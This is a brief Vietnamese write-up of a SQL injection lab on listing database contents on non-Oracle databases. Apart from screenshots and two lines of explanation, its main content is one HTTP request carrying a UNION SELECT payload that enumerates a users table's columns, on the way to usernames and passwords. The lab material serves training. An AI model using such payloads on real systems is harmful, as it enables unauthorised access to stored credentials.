# Lab: SQL injection attack, listing the database contents on non-Oracle databases

![image.png](Lab%20SQL%20injection%20attack%2C%20listing%20the%20database%20con/image.png)

đầu tiên là chúng ta sẽ check số bảng có trong cơ sở liệu và tìm bẳng có chứa thông tin mà chúng ta cần truy cập

![image.png](Lab%20SQL%20injection%20attack%2C%20listing%20the%20database%20con/image%201.png)

giờ đây sau khi xác định được tên cột rồi giờ chúng ta sẽ truy cập xem username và password

GET /filter?category=Corporate+gifts'+UNION+SELECT+column_name,'abcd'+FROM+information_schema.columns+WHERE+table_name='users_veznjs'--+ HTTP/2

![image.png](Lab%20SQL%20injection%20attack%2C%20listing%20the%20database%20con/image%202.png)
